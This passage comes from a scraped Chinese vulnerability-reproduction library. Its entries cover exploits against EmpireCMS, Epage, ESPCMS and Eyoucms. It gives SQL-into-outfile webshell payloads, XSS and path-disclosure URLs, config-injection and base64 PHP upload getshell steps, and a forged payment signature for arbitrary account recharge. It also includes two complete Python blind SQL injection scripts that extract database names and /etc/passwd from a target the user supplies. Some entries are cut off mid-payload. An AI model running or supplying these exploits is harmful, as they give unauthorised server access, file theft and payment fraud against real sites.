上传一个内容可以getshell的1.php.mod,内容入下:注意需要对$进行转义 \");?> 成功上传后,菜刀连接,成功getshell 10.png 参考链接 https://www.shuzhiduo.com/A/ZOJPejmP5v/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:49 "},"Web安全/EmpireCMS/（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞/（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞.html":{"url":"Web安全/EmpireCMS/（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞/（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞.html","title":"（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞","keywords":"","body":"（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞 一、漏洞简介 EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。 二、漏洞影响 EmpireCMS 7.5 三、复现过程 漏洞出现的页面如下 1.png 分析源码定位漏洞出现的位置在/e/admin/db/DoSql.php,浏览代码,对sqltext使用RepSqlTbpre函数进行处理 2.png 跟进RepSqlTbpre函数,发现仅仅对表的前缀做替换,没有做其他任何处理 3.png 继续浏览代码,发现对$query使用DoRunQuery函数进行处理 4.png 跟进DoRunQuery函数,可以看到对$sql参数只做了去除空格、以\";\"分隔然后遍历,并你没有做别的限制和过滤,导致可以执行恶意的sql语句 5.png 登录后台,点击如下,输入一段写shell的payload,payload内容如下: select '' into outfile 'C:/phpStudy/WWW/empirecms/shell.php' 6.png 点击\"执行SQL\",提示错误,是由于mysql安全限制的原因 7.png 修改mysql的配置文件, 在[mysqld] 下添加条目: secure_file_priv =,保存之后,然后重启mysql 8.png 再次执行SQL语句,可以看到成功执行SQL语句 9.png 查看是否成功上传shell 10.png 菜刀连接,成功getshell 11.png 参考链接 https://www.shuzhiduo.com/A/E35pxYYE5v/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:49 "},"Web安全/EmpireCMS/EmpireCMS 6.0 搜索框xss/EmpireCMS 6.0 搜索框xss.html":{"url":"Web安全/EmpireCMS/EmpireCMS 6.0 搜索框xss/EmpireCMS 6.0 搜索框xss.html","title":"EmpireCMS 6.0 搜索框xss","keywords":"","body":"EmpireCMS 6.0 搜索框xss 一、漏洞简介 二、漏洞影响 EmpireCMS 6.0 三、复现过程 https://www.0-sec.org/search/keyword/index.php?allsame=3\">alert(/zerosec/) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:39 "},"Web安全/EmpireCMS/EmpireCMS 6.6-7.2 路径泄漏/EmpireCMS 6.6-7.2 路径泄漏.html":{"url":"Web安全/EmpireCMS/EmpireCMS 6.6-7.2 路径泄漏/EmpireCMS 6.6-7.2 路径泄漏.html","title":"EmpireCMS 6.6-7.2 路径泄漏","keywords":"","body":"EmpireCMS 6.6-7.2 路径泄漏 一、漏洞简介 二、漏洞影响 EmpireCMS 6.6-7.2 三、复现过程 POC : EmpireCMS 6.6 : http://www.0-sec.org/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin& http://www.0-sec.org/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin& EmpireCMS 7.0 : http://www.0-sec.org/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin& EmpireCMS 7.2 : http://www.0-sec.org/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin& Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:40 "},"Web安全/EmpireCMS/EmpireCMS 7.5 前台xss/EmpireCMS 7.5 前台xss.html":{"url":"Web安全/EmpireCMS/EmpireCMS 7.5 前台xss/EmpireCMS 7.5 前台xss.html","title":"EmpireCMS 7.5 前台xss","keywords":"","body":"EmpireCMS 7.5 前台xss 一、漏洞简介 该漏洞是由于javascript获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。 利用条件：需要开启会员空间功能 二、漏洞影响 EmpireCMS 7.5 三、复现过程 需要开启会员空间功能(默认关闭),登录后台开启会员空间功能。 1.png 漏洞出现的位置在/e/ViewImg/index.html,浏览代码,发现如下代码存在漏洞 分析代码:通过Request函数获取地址栏的url参数,并作为img和a标签的src属性和href属性,然后经过document.write输出到页面。2.png 跟进Request函数 分析代码:通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置。 例如,地址是:index.html?url=javascript:alert(document.cookie),经过Request函数处理就变成javascript:alert(document.cookie) 3.png url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值。 4.png 通过上面的分析,可以发现代码没有对url的参数做过滤就直接拼接成a和img标签的属性的值,因此可以构造payload:? ?url=javascript:alert(/xss/) 浏览器访问http://www.0-sec.org/e/ViewImg/index.html?url=javascript:alert(/xss/) 5.png 点击图片便可触发 6.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:40 "},"Web安全/EmpireCMS/EmpireCMS 7.5 后台xss/EmpireCMS 7.5 后台xss.html":{"url":"Web安全/EmpireCMS/EmpireCMS 7.5 后台xss/EmpireCMS 7.5 后台xss.html","title":"EmpireCMS 7.5 后台xss","keywords":"","body":"EmpireCMS 7.5 后台xss 一、漏洞简介 该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理,但是没有对任何恶意关键字进行过滤,从而导致攻击者使用别的关键字进行攻击。 二、漏洞影响 EmpireCMS 7.5 三、复现过程 漏洞分析 漏洞出现的页面在/e/admin/openpage/AdminPage.php,浏览漏洞页面代码,发现使用hRepPostStr函数对leftfile、title、mainfile参数进行处理 1.png 跟进hRepPostStr函数,发现htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号) 2.png 继续浏览代码,发现使用CkPostStrChar函数对参数进行处理 3.png 跟进CkPostStrChar函数,处理编码字符4.png 继续浏览代码,发现又使用了AddAddsData函数对参数进行处理 5.png 跟进AddAddsData函数,分析代码:如果没有开启magic_quotes_gpc函数,就使用addslashes函数对参数中的特殊字符进行转义处理 6.png 继续浏览代码,发现在网页输出时, $leftfile、$mainfile参数的输出位置是iframe标签的src里面,由于代码没有对别的恶意字符进行处理,此时可以构造javascript:alert(/xss/),iframe标签可以执行javascript代码,此时就会触发XSS代码。 7.png 漏洞复现 浏览器访问构造的payloadhttp://www.0-sec.org/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/),提示非法来源 此时发现别的页面url地址中都会存在hash参数,例如ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK,这个参数是随机生成的,如果缺少这个参数,会提示非法来源 再次构造payload,浏览器访问,成功触发XSS http://www.0-sec.org/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&mainfile=javascript:alert(/xss/) http://www.0-sec.org/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&mainfile=javascript:alert(document.cookie) 参考链接 https://www.shuzhiduo.com/A/ZOJPejMP5v/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:40 "},"Web安全/EmpireCMS/EmpireCMS 7.5 后台任意代码执行漏洞/EmpireCMS 7.5 后台任意代码执行漏洞.html":{"url":"Web安全/EmpireCMS/EmpireCMS 7.5 后台任意代码执行漏洞/EmpireCMS 7.5 后台任意代码执行漏洞.html","title":"EmpireCMS 7.5 后台任意代码执行漏洞","keywords":"","body":"EmpireCMS 7.5 后台任意代码执行漏洞 一、漏洞简介 二、漏洞影响 EmpireCMS 7.5 三、复现过程 漏洞分析 漏洞代码发生在后台数据备份处代码/e/admin/ebak/ChangeTable.php 44行附近，通过审计发现执行备份时，对表名的处理程序是value=\"\" 通过php短标签形式直接赋值给tablename[]。 进行备份时未对数据库表名做验证，导致任意代码执行。 漏洞复现 1、查看代码e/admin/ebak/phome.php接收备份数据库传递的参数,然后传递给Ebak_DoEbak函数中。 　　 2、跟进Ebak_DoEbak函数所在的位置,可以看到将数据库表名传递给变量$tablename。 　　 3、继续浏览代码,可以看到如下代码,遍历表名并赋值给$b_table、$d_table,使用RepPostVar函数对表名进行处理,其中$d_table拼接成$tb数组时没有对键值名添加双引号。 　　 4、在生成config.php文件的过程中,对于$d_table没有进行处理,直接拼接到生成文件的字符串中,导致任意代码执行漏洞。 　　 5、访问后台 　　 6、按下图依次点击,要备份的数据表选一个就好 　　 7、点击”开始备份”,burp抓包,修改tablename参数的值 　　 8、可以看到响应的数据包,成功备份 　　 9.查看备份的文件 　　 10.访问备份目录下的config.php,可以看到成功执行phpinfo 　　 11、这时查看config.php文件 　　 参考链接 https://www.shuzhiduo.com/A/pRdBPopGJn/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:41 "},"Web安全/EmpireCMS/EmpireCMS 7.5 配置文件写入漏洞/EmpireCMS 7.5 配置文件写入漏洞.html":{"url":"Web安全/EmpireCMS/EmpireCMS 7.5 配置文件写入漏洞/EmpireCMS 7.5 配置文件写入漏洞.html","title":"EmpireCMS 7.5 配置文件写入漏洞","keywords":"","body":"EmpireCMS 7.5 配置文件写入漏洞 一、漏洞简介 该漏洞是由于安装程序时没有对用户的输入做严格过滤,导致用户输入的可控参数被写入配置文件,造成任意代码执行漏洞。 二、漏洞影响 EmpireCMS 7.5 三、复现过程 漏洞分析 1、漏洞出现位置如下图,phome_表前缀没有被严格过滤导致攻击者构造恶意的代码 　　 2、定位漏洞出现的位置,发现在/e/install/index.php,下图可以看到表名前缀phome_,将获取表名前缀交给了mydbtbpre参数。 　　 3、全文搜索,$mydbtbpre,然后跟进参数传递,发现将用户前端输入的表前缀替换掉后带入了sql语句进行表的创建,期间并没有对前端传入的数据做严格的过滤 　　 　　 4、创建表的同时将配置数据和可以由用户控制的表前缀一起写入到config.php配置文件 　　 5、通过对整个install过程的代码分析,可以发现没有对用户数据进行过滤,导致配置文件代码写入。 5.1、burp对漏洞存在页面进行抓包,修改phome参数的值,构造payload,payload如下: ‘;phpinfo();// 5.2、在burp中的phome参数的值中输入特殊构造的payload 　　 6、查看config.php配置文件,发现成功写入配置文件 　　 7、再次访问安装结束的页面, http://192.168.10.171/empirecms/e/install/index.php?enews=moddata&f=4&ok=1&defaultdata=1 　　 8、构造特殊的payload getshell 　　 9、菜刀连接,成功getshell 　　 参考链接 http://qclover.cn/2018/10/10/EmpireCMS\\_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:46 "},"Web安全/EmpireCMS/EmpireCMS 任意充值漏洞/EmpireCMS 任意充值漏洞.html":{"url":"Web安全/EmpireCMS/EmpireCMS 任意充值漏洞/EmpireCMS 任意充值漏洞.html","title":"EmpireCMS 任意充值漏洞","keywords":"","body":"EmpireCMS 任意充值漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞文件 https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php 漏洞详情 首先在/e/payapi/alipay/payend.php $sign=''; foreach($_GET AS $key=>$val) { if($key!='sign'&&$key!='sign_type'&&$key!='code') { $sign.=\"$key=$val&\"; } } $sign=md5(substr($sign,0,-1).$paykey); print($sign); if($sign!=$_GET['sign']) { printerror('验证MD5签名失败.','../../../',1,0,1); 这个是sign签名的验证没有检测来源是否为支付宝链接而且没有安装情况下key为0 所以我们可以自己构造sign https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php?sign=63b90f066d744a4d53150045837bd90d&trade_status=TRADE_FINISHED&trade_no=1111&out_trade_no=aaaaaa&total_fee=11111111 sign=63b90f066d744a4d53150045837bd90d是get的数组的md5值 当然需要登录情况下还要自己手动在用户中心提交次订单，系统会设置cookie满足条件然后在到我们sign的地方 提交后7.png8.png 参考链接 https://man-hin.lofter.com/post/37bd50\\_1c886dc36 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:49 "},"Web安全/Epage/Epage sql 注入漏洞/Epage sql 注入漏洞.html":{"url":"Web安全/Epage/Epage sql 注入漏洞/Epage sql 注入漏洞.html","title":"Epage sql 注入漏洞","keywords":"","body":"Epage sql 注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 将单引号用来站内搜寻时发现不可注入，正准备放弃时发现搜索结果的第N页的连结中使用了php序列刚好最近学到php序列不安全，未检查的情况下unserialize后会造成许多问题，甚至RCE看了一下序列的长相是否有机可称： wc=a:3:{s:3:\"Key\";s:4:\"test\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;} 嗯，是一个序列化过的array，里面的key竟然是我刚才的输入！？试试注入单引号，失败，准备放弃QQ我的输入会显示出来......，那试试XSS好了蛤，报错！？原来没有过滤双引号啊而且还回显了完整的sql语句开始闭合语句 透过构造 a:3:{s:3:\"Key\";s:42:\"\"and(substring(version(),1,1)=\"5\")and\"%\"=\"\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;} 查无资料 透过构造 a:3:{s:3:\"Key\";s:42:\"\"and(substring(version(),1,1)=\"5\")and\"%\"=\"\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;} 显示查询，以此类推 透过构造 a:3:{s:3:\"Key\";s:42:\"\"and(substring(version(),3,1)=\"0\")and\"%\"=\"\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;} 显示查询 透过构造 a:3:{s:3:\"Key\";s:42:\"\"and(substring(version(),5,1)=\"8\")and\"%\"=\"\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;} 显示查询 证明存在Boolean Based Blind Injection漏洞，mysql版本为5.0.8 poc1 retrive database 可通过poc解析server上的database名称与版本> 同理也可以进一步dump出每个栏位的资料 此外网站也有权限可以load_file（outfile试不出来，可能是没权限或我太菜了QQ） import requests import time print(\"Blind SQL injection in php Serialize POC\") url=input(\"Target url:\") url += \"/bin/ptsearch.php?wc=a:3:{s:3:\\\"Key\\\";s:@:\\\"*\\\";s:8:\\\"pagesize\\\";s:2:\\\"10\\\";s:3:\\\"Rcg\\\";i:0;}\" print(\"start parsing\") print(\"\") print(\"MYSQL version:\") for i in range(1,10,2): for k in range(0,10): session = requests.Session() closed_sql='\\\"and({inject})and\\\"%\\\"=\\\"' inject_sql= closed_sql.format(inject=\"substring(version(),{i},1)=\\\"{k}\\\"\") inject_sql= inject_sql.format(i=i,k=k) inject_url=url.replace(\"@\",str(len(inject_sql))) inject_url=inject_url.replace(\"*\",inject_sql) r = session.get(inject_url) r.encoding = 'utf-8' if(\"未找到符合條件的資料\" not in r.text): print(k,end=\".\") print(\"version detect complete,take a break...........\") print() print() time.sleep(5) print(\"parsing lenth of available database..............\") all_valid_database=0 for i in range(1,50): session = requests.Session() closed_sql='\\\"and({inject})and\\\"%\\\"=\\\"' inject_sql= closed_sql.format(inject=\"(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))>0\") inject_sql= inject_sql.format(i=i) inject_url=url.replace(\"@\",str(len(inject_sql))) inject_url=inject_url.replace(\"*\",inject_sql) r = session.get(inject_url) r.encoding = 'utf-8' if(\"未找到符合條件的資料\" in r.text): all_valid_database = i print(all_valid_database) break print(\"parsing finish,take a break\") time.sleep(3) print(\"start parsing available database\") print(\"available database:\") for i in range(1,all_valid_database): time.sleep(2) for k in range(32,126): session = requests.Session() closed_sql='\\\"and({inject})and\\\"%\\\"=\\\"' inject_sql= closed_sql.format(inject=\"(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))>{k}\") inject_sql= inject_sql.format(i=i,k=k) inject_url=url.replace(\"@\",str(len(inject_sql))) inject_url=inject_url.replace(\"*\",inject_sql) r = session.get(inject_url) r.encoding = 'utf-8' if(\"未找到符合條件的資料\" in r.text): if (k==44): print(chr(k),end=\"\") print() else: print(chr(k),end=\"\") break poc2 load etc/passwd import requests import time print(\"Blind SQL injection in php Serialize POC\") url=input(\"Target url:\") url += \"/bin/ptsearch.php?wc=a:3:{s:3:\\\"Key\\\";s:@:\\\"*\\\";s:8:\\\"pagesize\\\";s:2:\\\"10\\\";s:3:\\\"Rcg\\\";i:0;}\" print(\"start parsing\") print(\"\") all_valid_database=1436#如上一個poc的找法，但這次手動二分搜尋法xd，怕用程式跑，太密集會被server擋掉 print(\"start parsing available file\") print(\"etc/passwd:\") for i in range(1,all_valid_database): time.sleep(2) for k in range(32,126): session = requests.Session() closed_sql='\\\"and({inject})and\\\"%\\\"=\\\"' inject_sql= closed_sql.format(inject=\"(ascii(substring((select(load_file(\\\"/etc/passwd\\\"))),{i},1)))>{k}\") inject_sql= inject_sql.format(i=i,k=k) inject_url=url.replace(\"@\",str(len(inject_sql))) inject_url=inject_url.replace(\"*\",inject_sql) r = session.get(inject_url) r.encoding = 'utf-8' if(\"未找到符合條件的資料\" in r.text): print(chr(k),end=\"\") break 1.png 2.png 3.png 参考链接 https://zeroday.hitcon.org/vulnerability/ZD-2020-00601 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:50 "},"Web安全/ESPCMS/ESPCMS 反射型xss/ESPCMS 反射型xss.html":{"url":"Web安全/ESPCMS/ESPCMS 反射型xss/ESPCMS 反射型xss.html","title":"ESPCMS 反射型xss","keywords":"","body":"ESPCMS 前台反射型xss 一、漏洞简介 二、漏洞影响 ESPCMS P8.18101601 三、复现过程 POST /index.php?ac=Search&at=List HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 46 Origin: https://www.0-sec.org Connection: close Referer: https://www.0-sec.org8/index.php?ac=Search&at=List Cookie: zerosec; mid=0&keyword=\">Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:50 "},"Web安全/Eyoucms/Eyoucms 1.0 前台getshell/Eyoucms 1.0 前台getshell.html":{"url":"Web安全/Eyoucms/Eyoucms 1.0 前台getshell/Eyoucms 1.0 前台getshell.html","title":"Eyoucms 1.0 前台getshell","keywords":"","body":"Eyoucms 1.0 前台getshell 一、漏洞简介 官网：http://www.eyoucms.com/download/Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip 二、漏洞影响 三、复现过程 老样子：先讲如何利用 url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview 构造: post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw== Shell: http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php 原理分析 漏洞文件： eyoucms1.0\\application\\api\\controller\\Uploadify.php漏洞函数：preview() 这里我将每行有意义的代码都解释了一下帮助读者进行查看。 而我刚开始时也思考了一下，这会不会是作者故意搞的后门？带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的 表示data:image/ 居然还可以不是图片？好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/ 只能是图片。 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:51 "},"Web安全/Eyoucms/Eyoucms 1.3.5 后台getshell/Eyoucms 1.3.5 后台getshell.html":{"url":"Web安全/Eyoucms/Eyoucms 1.3.5 后台getshell/Eyoucms 1.3.5 后台getshell.html","title":"Eyoucms 1.3.5 后台getshell","keywords":"","body":"Eyoucms 1.3.5 后台getshell 一、漏洞简介 最新版本删除该功能 二、漏洞影响 Eyoucms 1.3.5 三、复现过程 漏洞分析 相关功能代码在application/admin/controller/Tools.php public function restoreUpload() { $file = request()->file('sqlfile'); if(empty($file)){ $this->error('请上传sql文件'); } // 移动到框架应用根目录/data/sqldata/ 目录下 $path = tpCache('global.web_sqldatapath'); $path = !empty($path) ? $path : config('DATA_BACKUP_PATH'); $path = trim($path, '/'); $image_upload_limit_size = intval(tpCache('basic.file_size') * 1024 * 1024); $info = $file->validate(['size'=>$image_upload_limit_size,'ext'=>'sql,gz'])->move($path, $_FILES['sqlfile']['name']); if ($info) { //上传成功 获取上传文件信息 $file_path_full = $info->getPathName(); if (file_exists($file_path_full)) { $sqls = Backup::parseSql($file_path_full); if(Backup::install($sqls)){ //array_map(\"unlink\", glob($path)); /*清除缓存*/ delFile(RUNTIME_PATH); /*--end*/ $this->success(\"执行sql成功\", url('Tools/restore')); }else{ $this->error('执行sql失败'); } } else { $this->error('sql文件上传失败'); } } else { //上传错误提示错误信息 $this->error($file->getError()); } } 上传过程中只验证了文件的大小和后缀，之后解析sql语句并执行。解析sql函数不再贴出，但并没有检测文件内容正常的sql语句都能通过解析。install函数直接执行了sql语句。 漏洞复现 登陆后台在高级选项->备份还原->数据还原可选择上传sql文件并执行 上传sql文件内容为（需要知道网站绝对路径） select '' into outfile 'D:\\\\tools\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\testcms\\\\1.php'; 上传成功后在网站根目录生成webshell。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:53 "},"Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/Eyoucms 1.3.9 上传漏洞.html":{"url":"Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/Eyoucms 1.3.9 上传漏洞.html","title":"Eyoucms 1.3.9 上传漏洞","keywords":"","body":"Eyoucms 1.3.9 上传漏洞 一、漏洞简介 EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。易优cms v1.3.7后台插件模块存在代码执 二、漏洞影响 Weapp.php文件中的create()方法接收了请求中的参数，过滤后直接存入php配置文件中，但是由于过滤不严，导致可以直接写入代码进去并执行。 三、复现过程 1、登陆后台 在后台-----》插件应用-----》上传插件这里可以上传zip文件 在Weapp.php文件中的upload()方法中可以上传zip文件，并会自动解压到一个文件夹名是随机md5值的文件夹下 在后台开启插件功能，上传zip文件，zip中有php一句话木马以及一个任意图片(图片内容无所谓，正常图片即可，但是必须得有) 上传后，虽然会返回错误信息，但是实际上后台已经解压了zip文件 访问内容管理模块，任意选择一个产品进行编辑，再图片集处可以上传图片，选择在线管理，可以在左侧看到该文件夹名 直接访问该文件夹下的php一句话木马文件即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:53 "},"Web安全/Eyoucms/Eyoucms 1.3.9 前台sql注入/Eyoucms 1.3.9 前台sql注入.html":{"url":"Web安全/Eyoucms/Eyoucms 1.3.9 前台sql注入/Eyoucms 1.3.9 前台sql注入.html","title":"Eyoucms 1.3.9 前台sql注入","keywords":"","body":"Eyoucms 1.3.9 前台sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org:8081/eyoucms/?m=home&c=View&a=index&aid=89 然后开启burp抓包，构建如下的包 需要改两方面的参数一是referer，改成我们访问的页面 然后将get的url构造为如下 然后放进sqlmap一把梭就行啦 代码分析 \\'url_screen_var\\'这个值=>\\'ZXLjbXM\\'，这里它cms也注释说明了这个参数代表了文章状态，在前台使用的。 ZXljbXM 这里使用这个参数是需要注册一个用户权限，正好是可以在前台使用 所以上图的refer就代表我们是从用户权限的那里过来的 根据它 ZXLjbXM 所需求的构造如下url。 GET /eyoucms/?ZXljbXM=1&a=index&c=Lists&m=home&tid=3&yanse=1 看最后的参数yanse 是它这个的cms的产品评论里的参数。本来是系统自带的 但是这个参数也是属于用户发表的文章里面的构造，所以结合ZXLjbXM 即可构造可以存在注入的url链接 它这里请求的参数没有做防护 其实它这个文件的三个参数都是可以注入但是构造的请求url不相同。通过更改最后的参数即可 如果安装者是经过调整此点，或者仅用来展示网站的，那利用点可能微乎其微了 这个注入点比较鸡肋。其实没有多少高深的东西，只是笔者运气好，恰好看见这个参数。要不真的发现不了。 因为这个文件属于它cms自带的一处产品编辑的文件，实在不容易被注意到。 四、参考链接 https://xz.aliyun.com/t/6983 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:55 "},"Web安全/Eyoucms/Eyoucms 1.4.1 前台rce/Eyoucms 1.4.1 前台rce.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.1 前台rce/Eyoucms 1.4.1 前台rce.html","title":"Eyoucms 1.4.1 前台rce","keywords":"","body":"Eyoucms 1.4.1 前台rce 一、漏洞简介 二、漏洞影响 Eyoucms 1.4.1 三、复现过程 漏洞分析 进入/application/api/controller/Ajax.php中的**function get_tag_memberlist**方法 public function get_tag_memberlist() { if (IS_AJAX_POST) { $htmlcode = input('post.htmlcode/s'); $htmlcode = htmlspecialchars_decode($htmlcode); $attarray = input('post.attarray/s'); $attarray = htmlspecialchars_decode($attarray); $attarray = json_decode(base64_decode($attarray)); /*拼接完整的memberlist标签语法*/ $innertext = \"{eyou:memberlist\"; foreach ($attarray as $key => $val) { if (in_array($key, ['js'])) { continue; } $innertext .= \" {$key}='{$val}'\"; } $innertext .= \" js='on'}\"; $innertext .= $htmlcode; $innertext .= \"{/eyou:memberlist}\"; /*--end*/ $msg = $this->display($innertext); // 渲染模板标签语法 $data['msg'] = $msg; $this->success('读取成功！', null, $data); } $this->error('加载失败！'); } 3 Line: 判断是否AJAX请求4 Line: 从post获取用户输入参数htmlcode的值并将结果赋值给$htmlcode5 Line: 将$htmlcode中的实体字符转换为正常字符7 Line: 从post获取用户输入参数attarray的值并将结果赋值给$attarray8 Line: 将$attarray中的实体字符转换为正常字符9 Line: 将$attarray进行base64解码再json解码12 Line: 定义标签13~18 Line: 使用foreach将$attay以键值对的方式遍历出来，判断每一个元素是否为js如果是那么直接进入下一次循环，否则\"{$key}='{$val}'\"连接到标签后面19 Line: 闭合第一个标签20 Line: 将$htmlcode拼接到标签后，作为内容使用21 Line: 将闭合标签拼接到$innertext中23 Line: 调用基类中的display方法并将$innertext传入 跟踪到/core/library/think/Controll.php文件中的**display**方法 protected function display($content = '', $vars = [], $replace = [], $config = []) { return $this->view->display($content, $vars, $replace, $config); } 3 Line: 调用视图类中的display方法，并将$content、$vars、$replace、$config传入 跟踪到/core/library/think/View.php文件中的**display**方法 public function display($content, $vars = [], $replace = [], $config = []) { return $this->fetch($content, $vars, $replace, $config, true); } 3 Line: 调用当前类中的fetch方法并将并将$content、$vars、$replace、$config传入 跟踪到/core/library/think/View.php文件中的**fetch**方法 public function fetch($template = '', $vars = [], $replace = [], $config = [], $renderContent = false) { // 模板变量 $vars = array_merge(self::$var, $this->data, $vars); // 页面缓存 ob_start(); ob_implicit_flush(0); // 渲染输出 try { $method = $renderContent ? 'display' : 'fetch'; // 允许用户自定义模板的字符串替换 // $replace = array_merge($this->replace, $replace, (array) $this->engine->config('tpl_replace_string')); $replace = array_merge($this->replace, (array) $this->engine->config('tpl_replace_string'), $replace); // 解决一个页面上调用多个钩子的冲突问题 by 小虎哥 /*插件模板字符串替换，不能放在构造函数，毕竟构造函数只执行一次 by 小虎哥*/ // if ($this->__isset('weappInfo')) { // $weappInfo = $this->__get('weappInfo'); // if (!empty($weappInfo['code'])) { // $replace['__WEAPP_TEMPLATE__'] = ROOT_DIR.'/'.WEAPP_DIR_NAME.'/'.$weappInfo['code'].'/template'; // } // } /*--end*/ $this->engine->config('tpl_replace_string', $replace); $this->engine->$method($template, $vars, $config); } catch (\\Exception $e) { ob_end_clean(); throw $e; } // 获取并清空缓存 $content = ob_get_clean(); // 内容过滤标签 Hook::listen('view_filter', $content); // $this->checkcopyr($content); return $content; } 4 Line: 将当前类中的成员属性$var、$data以及传入的$vars合并为一个数组并赋给$vars7~8 Line: 开启页面缓存11 Line: 使用三元运算符判断外部传入的$renderContent是否为真，若为真那么将display赋值给$method，否则将fetch赋值给$method24 Line: 调用Think类中的$method方法并将$template、$vars、$config传入 跟踪到/core/library/think/view/driver/Think.php中的**display**方法 public function display($template, $data = [], $config = []) { $this->template->display($template, $data, $config); } 3 Line: 调用模板类中的display方法并将$template、$data、$config传入 跟踪到/core/library/think/Template.php中的**display**方法 public function display($content, $vars = [], $config = []) { if ($vars) { $this->data = $vars; } if ($config) { $this->config($config); } $cacheFile = $this->config['cache_path'] . $this->config['cache_prefix'] . md5($content) . '.' . ltrim($this->config['cache_suffix'], '.'); if (!$this->checkCache($cacheFile)) { // 缓存无效 模板编译 $this->compiler($content, $cacheFile); } // 读取编译存储 $this->storage->read($cacheFile, $this->data); } 3~5 Line: 判断外部传入的$vars是否有值，若有那么则将$vars赋值给当前类中的成员属性data中6~8 Line: 判断$config是否有值，若有那么将$config传入当前类中的config方法9 Line: 生成缓存文件名称赋值给$cacheFile10~13 Line: 